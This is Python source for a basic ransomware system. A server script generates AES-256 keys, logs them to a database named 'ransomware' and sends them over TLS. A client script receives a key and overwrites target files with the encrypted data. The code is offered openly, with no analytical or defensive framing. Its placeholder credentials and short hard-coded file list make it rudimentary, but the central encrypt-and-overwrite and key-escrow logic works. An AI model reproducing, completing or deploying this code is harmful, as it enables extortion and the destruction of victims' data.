#server code
import socket
import ssl
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import mysql.connector

# Database connection setup (wont work not actual vaild values)
db = mysql.connector.connect(
    host="localhost",
    user="your_user",
    password="your_password",
    database="ransomware"
)
cursor = db.cursor()

def generate_key():
    key = get_random_bytes(32)  # 256-bit key for AES-256
    return key

def store_key(key):
    cursor.execute("INSERT INTO keys (secret_key) VALUES (%s)", (key,))
    db.commit()

# SSL setup for secure communication
context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
context.load_cert_chain(certfile="server.crt", keyfile="server.key")

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # socket using ipv4 and tcp protocol
server_socket.bind(('0.0.0.0', 443))
server_socket.listen(5)

print("Server is listening...")

with context.wrap_socket(server_socket, server_side=True) as secure_socket:
    conn, addr = secure_socket.accept()
    print(f"Connection established with {addr}")

    # Generate and send key to client
    secret_key = generate_key()
    store_key(secret_key)

    conn.send(secret_key)
    print("Secret key sent to client.")

# client code
import socket
import ssl
from Crypto.Cipher import AES
import os

# Function to pad data to AES block size
def pad(data):
    return data + b"\0" * (AES.block_size - len(data) % AES.block_size)

def encrypt_file(file_path, key):
    with open(file_path, 'rb') as file:
        plaintext = file.read()
    cipher = AES.new(key, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(pad(plaintext))

    with open(file_path, 'wb') as file:
        file.write(cipher.nonce)
        file.write(tag)
        file.write(ciphertext)

# SSL connection setup
context = ssl.create_default_context()
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

with context.wrap_socket(client_socket, server_hostname="server_hostname") as secure_socket:
    secure_socket.connect(('server_hostname', 443))

    # Receive the secret key from server
    secret_key = secure_socket.recv(32)
    print("Received secret key from server.")

    
    files_to_encrypt = ["file1.txt", "file2.txt"]  # needed to specify file paths
    for file_path in files_to_encrypt:
        encrypt_file(file_path, secret_key)
        print(f"{file_path} encrypted.")